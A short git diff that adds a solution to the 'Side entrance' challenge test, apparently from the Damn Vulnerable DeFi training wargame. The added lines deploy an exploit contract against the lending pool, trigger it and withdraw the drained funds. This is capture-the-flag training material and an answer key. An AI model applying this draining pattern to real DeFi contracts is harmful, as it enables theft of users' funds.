@@ -26,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let exp = await (await ethers.getContractFactory('SideEntranceLenderPoolExp', player)).deploy(pool.address);
+        await exp.exp();
+        await exp.withdraw();
     });
 
     after(async function () {
